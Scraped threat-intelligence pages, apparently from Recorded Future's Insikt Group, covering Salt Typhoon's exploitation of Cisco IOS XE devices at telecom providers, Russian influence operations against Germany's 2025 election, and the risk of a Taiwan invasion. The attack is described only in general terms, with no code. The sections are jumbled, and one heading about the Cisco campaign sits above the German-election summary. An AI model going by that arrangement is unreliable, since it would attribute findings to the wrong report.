          <li>RedMike compromised Cisco network devices of a US-based affiliate of a United Kingdom (UK) telecommunications provider and a South African telecommunications provider.</li>
          <li>RedMike exploited privilege escalation vulnerabilities CVE-2023-20198 and CVE-2023-20273 to compromise unpatched Cisco network devices running Cisco IOS XE software.</li>
          <li>Using Recorded Future Network Intelligence, Insikt Group identified RedMike attempting to exploit over 1,000 Cisco network devices between December 2024 and January 2025.</li>
        </ul>
        <h2>Background</h2>
        <p>In late September 2024, media reporting (<a href="https://www.wsj.com/politics/national-security/china-cyberattack-internet-providers-260bd835?st=cYA8J5&amp;reflink=desktopwebshare_permalink">1</a>, <a href="https://www.securityweek.com/chinas-salt-typhoon-hacked-att-verizon-report/">2</a>) stated that the Chinese state-sponsored group Salt Typhoon had compromised the networks of major US telecommunications companies, including Verizon (<a href="/research/redmike-salt-typhoon-exploits-vulnerable-devices?host=https%3A%2F%2Fwww.recordedfuture.com">1</a>), AT&amp;T, and Lumen Technologies. The activity likely affected telecommunications organizations globally, with some outlets <a href="https://www.politico.com/newsletters/national-security-daily/2024/12/12/we-need-to-talk-about-salt-typhoon-00183727">reporting</a> that Salt Typhoon compromised at least 80 organizations. SaltTyphoon used its access to telecommunications providers to snoop on <a href="https://www.darkreading.com/cyber-risk/salt-typhoon-apt-subverts-law-enforcement-wiretapping">US lawful intercept</a> targets and <a href="https://www.politico.com/news/2024/10/25/trump-hack-china-phones-00185608">intercept</a> the communications of significant US political figures. The effect of Salt Typhoon’s intrusions has reached the highest levels of the US government: Cybersecurity experts have <a href="https://www.reuters.com/world/us/us-agencies-brief-senators-chinese-salt-typhoon-telecom-hacking-2024-12-04/">briefed</a> the US Senate, CISA recently <a href="https://www.cisa.gov/resources-tools/resources/enhanced-visibility-and-hardening-guidance-communications-infrastructure">issued</a> guidance on hardening telecommunications infrastructure, and CISA and the FBI issued a joint <a href="https://www.forbes.com/sites/zakdoffman/2024/12/06/fbi-warns-iphone-and-android-users-stop-sending-texts/">warning</a> encouraging the use of encrypted end-to-end messaging applications for sensitive communications.</p>
        <p>Insikt Group tracks Salt Typhoon-aligned activity as RedMike. Salt Typhoon is a group name given by Microsoft Threat Intelligence; at this time, Microsoft has not published publicly available technical details of the group's activity. The only public information Microsoft has shared confirms an <a href="https://learn.microsoft.com/en-us/defender-xdr/microsoft-threat-actor-naming">overlap</a> with two existing threat activity group names: GhostEmperor (<a href="https://securelist.com/ghostemperor-from-proxylogon-to-kernel-mode/104407/">Kaspersky</a>) and FamousSparrow (<a href="https://www.welivesecurity.com/2021/09/23/famoussparrow-suspicious-hotel-guest/">ESET</a>).</p>
        <p>On January 17, 2025, the US Department of the Treasury’s Office of Foreign Assets Control (OFAC) <a href="https://home.treasury.gov/news/press-releases/jy2792">sanctioned</a> Sichuan-based cybersecurity company Sichuan Juxinhe Network Technology Co., Ltd. for their direct involvement with RedMike activity. OFAC stated that Sichuan Juxinhe Network Technology Co., Ltd. had direct involvement in exploiting US telecommunications and internet service provider companies. According to OFAC, China’s Ministry of State Security (MSS) has maintained strong ties with multiple computer network exploitation companies, including Sichuan Juxinhe.</p>
        <h2>Technical Analysis</h2>
        <h3>Cisco IOS XE Web UI Exploitation</h3>
        <p>Using Recorded Future Network Intelligence, Insikt Group identified that since early December 2024, RedMike has attempted to exploit over 1,000 internet-facing Cisco network devices worldwide, primarily those associated with telecommunications providers, using a combination of two privilege escalation vulnerabilities: CVE-2023-20198 and CVE-2023-20273. When successfully compromised, the group uses the new privileged user account to change the device's configuration and adds a GRE tunnel for persistent access and data exfiltration.</p>
        <p>The privilege escalation vulnerability CVE-2023-20198 was found in the Cisco IOS XE software web UI feature, version 16 and earlier, and <a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z">published</a> by Cisco in October 2023. Attackers exploit this vulnerability to gain initial access to the device and issue a privilege 15 command to create a local user and password. Following this, the attacker uses the new local account to access the device and exploits an associated privilege escalation vulnerability, CVE-2023-20273, to gain root user privileges.</p>

          </div>
        </div>
        <p>More than half of the Cisco devices targeted by RedMike were in the US, South America, and India. The remaining devices spanned over 100 other countries. Although the selected devices are primarily associated with telecommunications providers, thirteen were linked to universities across Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the US, and Vietnam.</p>
        <p>Often involved in cutting-edge research, universities are prime targets for Chinese state-sponsored threat activity groups to acquire valuable research data and intellectual property. Previous examples include APT40, which has <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-200a">targeted</a> universities for biomedical, robotics, and maritime research; RedGolf (APT41) <a href="https://www.justice.gov/archives/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer">for</a> medical research; and RedBravo (APT31), which has directly <a href="https://www.reuters.com/technology/cybersecurity/apt31-chinese-hacking-group-behind-global-cyberespionage-campaign-2024-03-26/">targeted</a> academics. China’s cyber strategy <a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf">aligns</a> with its broader economic and military goals, making universities high-value targets for long-term intelligence-gathering and technology acquisition.</p>
        <p>RedMike possibly targeted the following universities to access research in areas related to telecommunications, engineering, and technology, particularly at institutions like <a href="https://wireless.ee.ucla.edu/research/">UCLA</a> and <a href="https://www.tudelft.nl/onderwijs/opleidingen/masters/ee/msc-electrical-engineering/track-wireless-communication-and-sensing/related-research/">TU Delft</a>.</p>

          </div>
        </div>
        <p>RedMike’s scanning and exploitation activity occurred on six different occasions from December 2024 to January 2025.</p>
        <ul>
          <li>2024-12-04</li>
          <li>2024-12-10</li>
          <li>2024-12-17</li>
          <li>2024-12-24</li>
          <li>2025-01-13</li>
          <li>2025-01-23</li>
        </ul>
        <p>Network administrators operating a Cisco network device with IOS XE software web UI exposed to the internet can use the dates mentioned and advice in the mitigations section to identify potential RedMike exploitation activity.</p>
        <p>Using internet scanning data, Insikt Group identified more than 12,000 Cisco network devices with their web UIs exposed to the internet. Although over 1,000 Cisco devices were targeted, Insikt Group assesses that this activity was likely focussed, given that this number only represents 8% of the exposed devices and that RedMike engaged in periodic reconnaissance activity, selecting devices linked to telecommunications providers.</p>
        <h3>Compromised Telecommunications Provider Devices</h3>
        <p>Using Recorded Future Network Intelligence, Insikt Group observed seven compromised Cisco network devices communicating with RedMike infrastructure. These include devices associated with:</p>
        <ul>
          <li>A US-based affiliate of a UK telecommunications provider</li>
          <li>A US internet service provider (ISP) and telecommunications company</li>
          <li>A South African telecommunications provider</li>
          <li>An Italian ISP</li>
          <li>A large Thailand telecommunications provider</li>
        </ul>
        <p>RedMike configured GRE tunnels between the compromised Cisco devices and their infrastructure. GRE is a tunneling protocol used to encapsulate various network layer protocols inside point-to-point connections. It is a standard feature that can be configured on Cisco network devices. It is commonly used to create virtual private networks (VPNs), enable interoperability between different network types, and transport multicast or non-IP traffic over IP networks. Threat activity groups use GRE tunnels to maintain persistence by establishing covert communication channels that bypass firewalls and intrusion detection systems. These tunnels also facilitate stealthy data exfiltration by encapsulating stolen data within GRE packets, potentially bypassing network monitoring.</p>
        <h3>Reconnaissance of Myanmar Telecommunications Provider</h3>
        <p>In mid-December 2024, RedMike, from the same infrastructure that exploited the Cisco network devices, performed reconnaissance against multiple infrastructure assets operated by a Myanmar-based telecommunications provider, Mytel, likely including their corporate mail server.</p>

        <h3>Subject</h3>
        <p>Adversarial Actors — China, Russia, Iran, and North Korea — are adapting to and exploiting Western openness and fragmentation through hostile cyber, economic, and military actions.</p>
        <h3>Reporting and Analysis</h3>
        <ol>
          <li>The Risk of a Taiwan Invasion Is Rising Fast</li>
          <li>Russian Inﬂuence Operations Target German Elections</li>
          <li>RedMike (Salt Typhoon) Exploits Vulnerable Cisco Devices of Global Telecommunications Providers</li>
          <li>Inside the Scam: North Koreaʼs IT Worker Threat</li>
        </ol>
        <h3>The Risk of a Taiwan Invasion Is Rising Fast</h3>
        <p><em><a href="http://recordedfuture.com/research/risk-taiwan-invasion-rising">Click here</a></em> <em>to read the report.</em></p>
        <h4>Key Takeaways</h4>
        <ul>
          <li>An invasion is currently unlikely, but political, economic, and military trends suggest that by 2027, China’s leadership will be able to consider an invasion while minimizing the costs.</li>
          <li>A protracted war over Taiwan would have profound consequences for the global economy, disrupting critical shipping lanes and devastating technology supply chains in East Asia.</li>
          <li><strong>Bottom Line:</strong> Businesses should begin investing in contingency plans to protect and diversify their operations in case China invades or undertakes other signiﬁcant military action against Taiwan in the coming decade.</li>
        </ul>
        <h3>Russian Influence Operations Target German Elections</h3>
        <p><em><a href="http://recordedfuture.com/research/stimmen-aus-moskau-russian-influence-operations-target-german-elections">Click here</a></em> <em>to read the report.</em></p>
        <h4>Key Takeaways</h4>
        <ul>
          <li>The forthcoming German elections are a target of Russian inﬂuence operations. As of mid-February, these operations have not meaningfully altered voter behavior or public opinion.</li>
          <li>These operations aim to inﬂame German sociopolitical divisions, spread manipulated content, foster anti-US and EU sentiment, and weaken NATO unity in line with Kremlin objectives.</li>
          <li><strong>Bottom Line:</strong> These inﬂuence operations have had limited voter impact, but their persistence and evolving tactics elevate the threat of a breakout inﬂuence event.</li>
        </ul>
        <h3>RedMike (Salt Typhoon) Exploits Vulnerable Cisco Devices of Global Telecommunications Providers</h3>

        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>The German federal elections, scheduled for February 23, 2025, are the target of malign influence operations linked to Russia and Russia-based actors. As of mid-February 2025, Insikt Group assesses that, despite their persistence, these efforts have very likely not meaningfully altered voter behavior or shaped public opinion in a manner advantageous to Russia’s broader geopolitical interests, consistent with <a href="https://www.brookings.edu/articles/the-impact-of-russian-interference-on-germanys-2017-elections/">assessments</a> of Russian meddling attempts in previous German election cycles.</p>
        <p>The influence operations and corresponding networks tracked in this report — Doppelgänger, Operation Overload, CopyCop, Operation Undercut, and the Russia-based Foundation to Battle Injustice — are longstanding and at least partially Kremlin-funded. These operations almost certainly seek to incite and escalate German domestic socio-political conflicts, pollute the German information space by introducing manipulated content, foster criticism of the United States (US) and European Union (EU) and European integration, and undermine North Atlantic Treaty Organization (NATO) cohesion in line with the Kremlin’s strategic objectives.</p>
        <p>The 2025 German election cycle marks a period of evolution for several of these operations, while core narratives remain unchanged. For example, Doppelgänger and Operation Overload have expanded beyond mainstream social media to Bluesky Social (Bluesky), in an attempt to capture migrating audiences. Doppelgänger and CopyCop have launched new brands and websites to project influence and reinforce messaging in the face of intensified scrutiny of their operations. Operation Overload continues to use artificial intelligence (AI)-based tools, including the use of AI-enabled voice cloning technology to create audio deepfakes, while both Operation Overload and Operation Undercut pose as real news organizations to increase their credibility.</p>
        <p>Despite limited evidence that these operations have meaningfully influenced voter behavior, they still pose broader risks to media integrity and public trust. Narratives undermining election security or integrity could reduce voter turnout, while media engagement with inauthentic content — rather than exposing the tactics behind it — may amplify malign messaging. Regarding Operation Overload specifically, we continue to assess that the potential for significant breakout does exist, as evidenced in the <a href="https://meduza.io/en/feature/2025/02/06/elon-musk-and-trump-jr-repost-fake-e-news-video-about-usaid-created-by-pro-kremlin-disinformation-network">viral spread</a> of a recent video attributed to this network that disparaged the United States Agency for International Development (USAID) in social media. To mitigate these risks, media entities, the public sector, and researchers should continue monitoring known influence networks while limiting engagement with operations such as Doppelgänger, Operation Overload, and Operation Undercut. Impersonated organizations should engage takedown services for malicious domains, collaborate with platform trust and safety teams, and proactively detect brand abuse tactics like typosquatting and logo manipulation.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>The German federal elections are the target of malign influence operations attributed to Russia and Russia-based actors.</li>
          <li>Russia-attributed influence operations have promoted and will very likely continue to support German political parties Russia views as beneficial to its own geopolitical interests, particularly Alternative für Deutschland (AfD).</li>
          <li>Doppelgänger is very likely exerting influence through at least seven new inauthentic news brands, in addition to the operation’s persistent media impersonation activities, to exacerbate political fissures and inflame political discourse surrounding European integration, immigration, and economic matters.</li>
          <li>Operation Overload’s media impersonations aim to sow distrust among German citizens toward the safety and integrity of voting, attack the characters of key political leaders, and present Germany as a rising hotbed of antisemitism and extremism.</li>
          <li>Insikt Group detected at least 94 new inauthentic websites –– whose creation began in November 2024 after the announcement of upcoming snap elections –– that we attribute to CopyCop impersonating German-language news websites.</li>
          <li>Following Insikt Group’s November 2024 investigation into Operation Undercut, we have observed the network continuing to post German-language content supporting AfD and undermining German Chancellor Olaf Scholz.</li>
          <li>The Foundation to Battle Injustice very likely seeks to undermine the reputations of German political leaders while promoting political platforms aligned with Russian interests through inauthentic investigative articles.</li>
        </ul>
        <h2>New Doppelgänger “Brands” Target Key German Election Issues</h2>
        <p>Insikt Group has detected at least eight new websites acting as original news brands, in addition to continued media impersonation with social media promotion, which we attribute to Doppelgänger, a longstanding Russian influence operation. <a href="https://www.disinfo.eu/doppelganger-operation/">Doppelgänger</a> is very likely positioning these newly established websites — previously not linked to the network — to sustain its influence operations targeting European political leadership and to exacerbate political fissures surrounding European integration, immigration, economic matters, and more. Throughout 2024, researchers, government entities, and technology companies <a href="https://www.qurium.org/alerts/exposing-the-evil-empire-of-doppelganger-disinformation/">continued</a> <a href="https://www.qurium.org/forensics/when-kehr-meets-vextrio/">exposing</a> Doppelgänger's activities across Europe and North America, leading to a US Department of Justice <a href="https://www.justice.gov/opa/pr/justice-department-disrupts-covert-russian-government-sponsored-foreign-malign-influence">indictment</a> against its operators at the Social Design Agency (SDA), international sanctions on SDA and affiliated entities, and at least partial — though often temporary — disruptions to its operations through takedowns and seizures. In response, SDA typically attempted to reestablish its operations within hours to days by deploying new infrastructure.</p>
        <p>While Doppelgänger is best known for the <a href="https://www.disinfo.eu/doppelganger/">direct impersonation</a> of legitimate Western media organizations, the influence operation has also managed a multitude of its own original news website “brands”, each targeting a specific country (such as Germany), with content directly tailored to the key domestic and foreign policy issues of that target audience, such as immigration policy, Germany’s ongoing socio-economic challenges, and questions of Germany’s place as Europe’s leader (as seen in <strong>Figure 1</strong>). Insikt Group has observed Doppelgänger abandoning several of its “legacy” brand websites with attempts to establish new brands, including multiple websites specific to German politics, likely due to a combination of repeated discovery and disruption of several of these websites.</p>
        <p>While we continue to observe Doppelgänger evolve its tactics and attempt to evade defenders, its ability to meaningfully impact public discourse very likely remains limited. Despite continued efforts to expand its network, Doppelgänger remains constrained by low levels of engagement, with minimal views and interactions across its newly launched domains and social media brands.</p>
        <h3>Using New Infrastructure to Deliver Old Themes</h3>
        <p>Since October 2024, Insikt Group has tracked a series of new domain registrations, discovering web page infrastructure that overlaps with previously attributed Doppelgänger-controlled domains. As of February 2025, Doppelgänger has registered ten domains that include eight new websites and two “parked” domains. The active domains reflect seven news brands that target German-speaking audiences:</p>

        <p>Similar to Doppelgänger’s legacy brands, these newly observed German-language sites each frame key socio-economic and political topics — such as Germany’s place in Europe, the state of the German economy, migration, and support to Ukraine — in ways that are highly relevant to German voters, reflecting thematic approaches seen in prior campaigns targeting elections in both France and the US. Specific examples include the Doppelgänger brand “Kriminal Radar”, which is used to provoke German fear over safety and security, and in particular fear toward migrants. Meanwhile, Östlicher Wind is an East Germany-oriented publication that promotes feelings of Euroskepticism, distrust toward the US and Ukraine, “traditional” values, and promotion of right-wing political entities, such as AfD.</p>

        <p>Doppelgänger continues to create and operate mass social media accounts to disseminate its messages using domain obfuscation techniques Insikt Group <a href="/research/russian-influence-network-doppelgangers-ai-content-tactics">illustrated</a> in December 2023. Furthermore, Doppelgänger also continues to leverage various branded social media accounts that align with its Germany-oriented websites, including “Arbeitspause_1.0”, “Bayerischer Löwe”, and “Der Rattenfänger”. Many of these personas mirror Doppelgänger’s historical tactics, using localized narratives, falsified news formats, and networked amplification to increase credibility among target audiences. According to a January 2025 <a href="https://btw2025.cemas.io/artikel/update-doppelgaenger">analysis</a> by the German Center for Monitoring, Analysis, and Strategy (CeMAS), over 630 Doppelgänger-attributed social media posts occurred between December 2024 and January 2025, engaging in coordinated inauthentic behavior (CIB) and promoting non-credible narratives on German politics, economics, and immigration.</p>

          <img loading="lazy" alt="insikt-group-logo-updated-3-300x48.png" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>Businesses should now begin making preparatory investments to establish contingency plans in case of a Taiwan invasion, especially if they operate in Taiwan or China, rely heavily on supply chains or shipping in Asia, or are located in countries likely to oppose China’s geopolitical objectives. While an invasion in the short term (2025–2026) is currently unlikely, the factors informing Insikt Group’s assessment are rapidly evolving. Beginning in 2027 and continuing through the long term (2027–2049), the risk of an invasion will very likely continue to increase, though it is not inevitable that an invasion will occur. In the short term, China is almost certain to continue its current coercive efforts, including major military exercises and incursions into maritime and air spaces near Taiwan, while seeking ways to incrementally escalate such coercion below the level of an invasion. In these efforts, China is likely to initiate a temporary law enforcement-led quarantine and a disruptive cyber campaign against Taiwan’s critical infrastructure​​.</p>
        <p>Our assessment is based on a range of behaviors and trends across China, Taiwan, and the United States (US), as described in the <strong>Key Findings</strong> below, and in consideration of China’s broader geopolitical context (see <strong>Appendix A</strong>). Fundamentally, in the short term, we assess that — absent a specific catalyst that leads to war (such as if Taiwan were to declare formal independence) — the Chinese Communist Party (CCP) leadership is very likely to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion of Taiwan, or other conflict with foreign powers (such as over the South China Sea). In the long term, we assess that China will likely have established a level of preparedness across the military, economic, social, and other domains by 2027 that would enable its leadership to invade Taiwan as a “war of choice” (rather than in response to a specific catalyst) while minimizing associated costs and risks.</p>
        <p>Our assessment is generally aligned with public statements by Taiwan and US government and military officials since the start of 2023, both of which emphasize active preparations regardless of speculation about specific timelines. More specifically, Taiwan officials express that an invasion is currently unlikely despite the potential for a diversionary war to distract from China’s domestic economic challenges. They also highlight weaknesses in the People’s Liberation Army’s (PLA’s) amphibious capability while recognizing the PLA could likely execute a blockade of Taiwan — the foremost alternative to an invasion. US officials express that an invasion is not imminent or inevitable, but that the risk is increasing and that China’s forces are on track to meet their modernization and readiness goals.</p>
        <p>An invasion would almost certainly severely impact the global economy, disrupting critical shipping lanes, devastating the semiconductor industry, and imposing broad costs on Taiwan, China, and potentially the US. Businesses likely to be affected by a Taiwan invasion scenario should consider taking steps such as building relationships with potential alternative suppliers outside of Asia, evaluating the purchase of war risk insurance, conducting scenario-based stress tests to identify vulnerabilities in operations and investments, maintaining encrypted offline backups of key computer systems and data, isolating high-value computer systems to limit an adversary’s lateral movement in case of a breach, and purchasing a geopolitical threat intelligence capability to support ongoing monitoring of the Taiwan issue (additional recommendations can be found in the <strong>Preparing for Potential Global Economic Disruption</strong> section of this report). Indicators of escalation to support monitoring are provided in <strong>Appendix B</strong>. Given the public focus on the impact of an invasion on Taiwan’s semiconductor industry, <strong>Appendix C</strong> further offers our assessment of why that industry is not especially relevant to judging if or when China might invade.</p>
        <h2>Key Findings</h2>
        <p>Assessments supporting our judgment that an invasion is unlikely in the short term include:</p>
        <p>China almost certainly continues to prefer “peaceful reunification” and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements. China’s economy is facing challenges that are very likely holding the focus of leadership as they strive to attain national rejuvenation. Despite PLA progress in developing capabilities necessary for a successful invasion of Taiwan, China’s military continues to have limitations in areas that suggest it is not yet ready to undertake an invasion. China’s leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. Although long-term public opinion trends in Taiwan are unfavorable to China’s goals, polling results since 2020 likely suggest to China’s leadership that its strategy is working to curb preferences for independence in the short term.</p>
        <p>Assessments supporting our judgment of rising risk in the long term include:</p>
        <p>The CCP has become increasingly assertive and very likely expectant of progress with regard to its goals for Taiwan. Under Xi Jinping’s leadership, the CCP has taken administrative and other measures to develop a self-sufficient economy, harden against foreign economic coercion such as sanctions, decrease reliance on the US dollar, and prepare for shortages in strategic resources like grain and critical minerals. China-based cyber threat actors are targeting US critical infrastructure in ways that suggest their goal is to pre-position for a potential conflict. China’s leadership has intensified its use of “lawfare” measures against Taiwan, particularly over the past year. The PLA, China’s wider armed forces, and China’s defense industry are continuing to improve capabilities that would be needed for a successful invasion of Taiwan, countering US intervention, and other scenarios. The political and social environments in Taiwan are both trending toward potentially permanent rejection of unification. China’s leadership almost certainly perceives US government behavior as trending toward overturning its (the US’s) “one-China” policy, which is one of Beijing’s likely “red lines” that could hasten an invasion scenario.</p>
        <h2>Indicators an Invasion Is Unlikely in the Short Term</h2>
        <p>There are several elements of China’s behavior that support our assessment that a Taiwan invasion is unlikely before 2027. These include China’s almost certain continuing preference for “peaceful reunification”, indicators that it very likely continues to pursue a dual-track approach to Taiwan, economic challenges that very likely take priority given China’s other ambitions, shortfalls in PLA capability, and limited indication that China has begun mobilizing its populace to brace for wartime hardship. Additionally, public opinion polling results in Taiwan since 2020 likely suggest to China’s leadership that its coercive strategy is working to deter independence in the short term. In totality, we assess that — absent a specific catalyst that leads to war (such as if Taiwan declares formal independence or China assesses foreign military interference in Taiwan) — the CCP leadership is very likely, in the short term, to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion, or other conflict with a foreign power (for example, over the South China Sea).</p>
        <h3>Trends in China</h3>
        <p>China almost certainly continues to prefer “peaceful reunification” and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements. While the coercive elements of the CCP’s strategy — including large-scale military <a href="https://jamestown.org/program/joint-sword-2024b-quarantining-key-ports-and-seizing-comprehensive-superiority/">exercises</a> (reportedly with <a href="https://web.archive.org/web/20250115022309/https://www.nsb.gov.tw/en/assets/documents/%E6%96%B0%E8%81%9E%E7%A8%BF/7d118bec-6a18-4e95-ad85-4055fc48cc31.pdf">cyber</a> components), air defense identification zone (ADIZ) <a href="https://www.platracker.com/trackers">incursions</a>, and expanding law enforcement <a href="https://amti.csis.org/a-new-normal-for-the-china-coast-guard-at-kinmen-and-matsu/">patrols</a> around Taiwan’s outlying islands — receive the most attention, examples of the other side of CCP strategy include the following: a June 2024 <a href="https://web.archive.org/web/20240723172644/https://www.cnbayarea.org.cn/policy/policy%20release/policies/content/post_1250199.html">plan</a> to “deepen cross-strait innovation and development cooperation” in Dongguan city, January 2024 reforms in Fujian that <a href="https://archive.ph/LWG6O">created</a> new government offices for Taiwan work, and a September 2023 <a href="https://web.archive.org/web/20240815054655/http://english.www.gov.cn/policies/latestreleases/202309/12/content_WS65004bc9c6d0868f4e8df605.html">plan</a> to build a “cross-strait integrated development demonstration zone” in Fujian province, and 68 other preferential policies and measures <a href="https://www.prcleader.org/post/enabling-patriots-to-be-masters-of-the-island-evolution-of-xi-s-policy-on-taiwan-since-2013">targeting</a> Taiwan businesses in China between 2018 and 2020. Xi Jinping’s activities in October 2024 also very likely signal this dual-track approach, <a href="https://web.archive.org/web/20241002182322/http://paper.people.com.cn/rmrb/html/2024-10/01/nw.D110000renmrb_20241001_1-02.htm">omitting</a> references to “peace” in statements relevant to Taiwan and <a href="https://web.archive.org/web/20250114205257/https://www.gov.cn/yaowen/liebiao/202410/content_6980772.htm">visiting</a> locations significant to China’s civil war history while also calling for greater integrated development. On January 15, 2025, a spokesperson for the Taiwan Affairs Office <a href="https://web.archive.org/web/20250116143803/http://www.news.cn/20250115/a8bedeb7d74b45ba8052a10586860648/c.html">reiterated</a> that integrated development is a focal point for the coming year. Additionally, there is almost certainly still no strict deadline for <a href="https://interpret.csis.org/what-is-beijings-timeline-for-reunification-with-taiwan/">achieving</a> unification.</p>
        <p>China’s economy is in a period of transition, volatility, and struggle, facing challenges that are very likely holding the focus of leadership as it strives to attain national rejuvenation and continue preparing for potential armed conflict. China’s challenges include a <a href="https://www.cnbc.com/2024/10/30/chinas-property-market-is-expected-to-stabilize-in-2025-.html#:~:text=China%20Economy-,China's%20property%20market%20is%20expected%20to%20stabilize%20in,but%20stay%20subdued%20for%20years&amp;text=China's%20struggling%20real%20estate%20sector,latest%20stimulus%20measures%2C%20analysts%20predict.">depressed</a> property market, <a href="https://www.fitchratings.com/research/sovereigns/deflation-in-china-risks-becoming-entrenched-05-11-2024">deflation</a>, <a href="https://www.rfa.org/english/china/2024/11/18/china-local-government-hidden-debt-explained/#:~:text=The%20International%20Monetary%20Fund%20estimates,%25%20of%20GDP%2C%20Reuters%20reported.">high</a> local government debt, <a href="https://www.voanews.com/a/foreign-investment-in-china-falls-for-past-year-as-economy-struggles/7682513.html">declining</a> foreign investment, <a href="https://www.nbcnews.com/news/world/chinas-youth-unemployment-hits-fresh-high-economic-slowdown-restrictiv-rcna172183">elevated</a> youth unemployment, and <a href="https://www.cnbc.com/2024/09/27/chinas-ambitions-for-chip-self-sufficiency-thwarted-by-lack-of-tools-.html">lingering dependence</a> on critical foreign technology like semiconductor production tools (for more on the relevance of semiconductors in China’s likely Taiwan invasion calculus, see <strong>Appendix C</strong>), while <a href="https://www.interest.co.nz/public-policy/129617/yuen-yuen-ang-explains-chinas-seemingly-contradictory-trajectory-characterised">shifting</a> toward “a green, high-tech” structure. These and other challenges have led to arguments that China could invade Taiwan to distract from domestic troubles (<a href="https://asia.nikkei.com/Politics/International-relations/Taiwan-tensions/China-could-threaten-war-in-2023-to-force-talks-Taiwan-official">1</a>, <a href="https://news.sky.com/story/china-more-likely-to-invade-taiwan-and-attack-could-come-in-2027-islands-foreign-minister-joseph-wu-warns-12789179">2</a>, <a href="https://www.theguardian.com/us-news/2023/aug/11/joe-biden-china-economy-time-bomb">3</a>, <a href="https://www.wilsoncenter.org/publication/desperate-times-desperate-measures-slowing-growth-making-china-more-dangerous">4</a>), but this is unlikely. First, diversionary war has not been the CCP’s method for <a href="https://www.foreignaffairs.com/china/myth-chinese-diversionary-war">managing</a> domestic crises since 1949. Second, the economic challenges are likely not great enough to <a href="https://www.prcleader.org/post/getting-to-world-class-can-china-s-military-persevere">derail</a> the PLA’s ongoing modernization in ways that would limit China’s option to use force in the future. During this period, Xi Jinping is very likely to focus on solving domestic economic problems while strengthening the military to support conditions for achieving national rejuvenation by 2049 — a goal with an <a href="https://www.strategictranslation.org/glossary/great-rejuvenation-of-the-chinese-nation">economic component</a> — and to prepare for unifying with Taiwan through force if doing so is deemed necessary.</p>
        <p>Despite PLA progress toward developing capabilities necessary for a successful invasion of Taiwan (discussed further below), China’s military continues to have limitations in areas that suggest it is not yet ready to undertake such a high-risk operation. These limitations very likely include a lack of sealift capacity for an invasion of Taiwan, inadequate rapid runway repair capabilities to <a href="https://www.airuniversity.af.edu/CASI/Display/Article/3430623/the-regenerating-road-chinas-rapid-runway-repair-capabilities-and-other-recover/">restore</a> air operations following enemy assaults, difficulty <a href="https://digital-commons.usnwc.edu/cmsi-maritime-reports/34/">integrating</a> submarine forces into joint operations, and helicopter forces that have readiness and operational capacity limitations. Corruption also <a href="https://media.defense.gov/2024/Dec/18/2003615520/-1/-1/0/MILITARY-AND-SECURITY-DEVELOPMENTS-INVOLVING-THE-PEOPLES-REPUBLIC-OF-CHINA-2024.PDF">continues</a> to be a <a href="https://thediplomat.com/2024/12/can-china-ever-weed-out-corruption-in-its-military/">major challenge</a> for the PLA and China’s <a href="https://thediplomat.com/2024/09/the-logic-of-chinas-careful-defense-industry-purge/">defense industry</a>, potentially disrupting the military’s organizational command, the quality of its personnel, its preparedness for warfare, and the attainment of its modernization goals.</p>
        <p>China’s leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. This point is debated, with some analysts focusing on Xi Jinping’s <a href="https://www.hoover.org/sites/default/files/research/docs/4_BoilingMoat_Ch1.pdf">warning</a> that “the stormy seas of a major test” are looming, his <a href="https://web.archive.org/web/20230531131348/http://politics.people.com.cn/n1/2023/0530/c1024-40002443.html">emphasis</a> on “worst-case scenario thinking”, and the CCP’s escalating rhetoric targeting Taiwan. However, when asked about this language during a US Congressional hearing in 2024, multiple experts from the US, India, and elsewhere <a href="https://www.uscc.gov/sites/default/files/2024-06/June_13_2024_Hearing_Transcript.pdf">assessed</a> that available evidence likely does not point to warnings of an imminent invasion specifically, but rather to the rising risks of China’s volatile economic and geopolitical context generally (see <strong>Appendix A</strong>). In particular, these experts <a href="https://www.uscc.gov/sites/default/files/2024-06/June_13_2024_Hearing_Transcript.pdf">focus</a> on the lack of state content “demonizing” China’s would-be opponents in Taiwan and likely the US. Moreover, only about 50% — at most — of the Chinese public likely supports a use of force to unify Taiwan under certain conditions; China’s leadership would likely prefer a stronger base of popular support before initiating a high-risk and potentially costly invasion, for reasons related to PLA <a href="https://www.uscc.gov/sites/default/files/2024-06/Devin_Thorne_Testimony.pdf">reliance</a> on civilian systems and because failure could threaten at least the current CCP leadership if not wider party legitimacy (<a href="https://digitalcommons.ndu.edu/cgi/viewcontent.cgi?article=1118&amp;context=strategic-forums">1</a>, <a href="https://www.airuniversity.af.edu/JIPA/Display/Article/2444775/the-day-after-the-battle/">2</a>, <a href="https://www.usip.org/publications/2024/11/many-ways-fail-costs-china-unsuccessful-taiwan-invasion">3</a>).</p>
        <h3>Trends in Taiwan and the US</h3>
